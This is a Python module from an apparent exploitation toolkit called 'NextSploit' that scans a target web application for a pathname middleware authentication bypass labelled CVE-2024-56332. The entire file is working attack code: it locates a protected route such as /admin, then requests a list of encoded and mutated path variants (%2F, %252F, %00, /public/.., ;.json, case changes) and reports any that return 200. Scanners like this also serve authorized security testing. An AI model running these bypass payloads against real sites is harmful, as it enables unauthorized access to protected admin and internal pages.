#!/usr/bin/env python3
"""
NextSploit — CVE-2024-56332: Pathname Middleware Auth Bypass
"""

import requests
from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import log_info, log_success, log_warning, log_debug, print_finding

CVE_ID = "CVE-2024-56332"
CVE_INFO = CVE_DATABASE.get(CVE_ID, {"title": "Pathname Middleware Auth Bypass", "severity": "HIGH"})

def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO.get("title", "Pathname Middleware Auth Bypass"),
        severity=CVE_INFO.get("severity", "HIGH"),
        status="NOT VULNERABLE"
    )
    
    session = config.create_session()
    target = config.target.rstrip("/")
    
    log_info(f"Starting {CVE_ID} scan...")

    # Identify protected path. We'll use /admin as a default test case.
    protected_paths = ["/admin", "/dashboard", "/private", "/api/internal"]
    
    try:
        found_protected = False
        base_target = ""
        base_status = 0
        
        for p in protected_paths:
            r = session.get(f"{target}{p}", timeout=config.timeout, allow_redirects=False)
            if r.status_code in [401, 403, 302, 301, 307, 308]:
                found_protected = True
                base_target = p
                base_status = r.status_code
                log_debug(f"Found protected path '{p}' (Status: {r.status_code})")
                break
                
        if not found_protected:
            log_debug("Could not find a protected path to test. Falling back to /admin")
            base_target = "/admin"
            base_status = 401

        # Test variants
        variants = [
            f"{base_target}%2F",
            f"{base_target}%252F",
            f"{base_target}%2e%2e",
            f"{base_target}/",
            f"{base_target}//",
            base_target.upper(),
            base_target.capitalize(),
            f"{base_target}%00",
            f"/public/..{base_target}",
            f"{base_target};.json",
            f"{base_target};next",
            f"//{base_target.lstrip('/')}"
        ]
        
        for variant in variants:
            url = f"{target}{variant}"
            log_debug(f"Testing variant: {url}")
            r = session.get(url, timeout=config.timeout, allow_redirects=False)
            
            # If the response changes from forbidden/redirect to 200 OK
            if r.status_code == 200 and base_status != 200:
                # Basic FP check: ensure it's not just a generic 200 error page or default index
                if "login" not in r.text.lower() and "unauthorized" not in r.text.lower():
                    detail = f"Potential pathname middleware bypass at {url}"
                    log_warning(detail)
                    
                    evidence = {
                        "endpoint": url,
                        "variant": variant,
                        "base_path": base_target,
                        "base_status": base_status,
                        "bypass_status": r.status_code
                    }
                    
                    print_finding(CVE_ID, detail, evidence)
                    
                    result.add_finding(Finding(
                        cve=CVE_ID,
                        severity=CVE_INFO.get("severity", "HIGH"),
                        title="Pathname Middleware Auth Bypass Detected",
                        status="VULNERABLE",
                        detail=detail,
                        evidence=evidence,
                        confidence=0.8
                    ))
                    
                    # Stop after finding one working bypass
                    break
                    
    except requests.RequestException as e:
        result.error = str(e)
        
    if result.finding_count == 0:
        log_success("No Pathname Middleware Bypass detected")

    return result
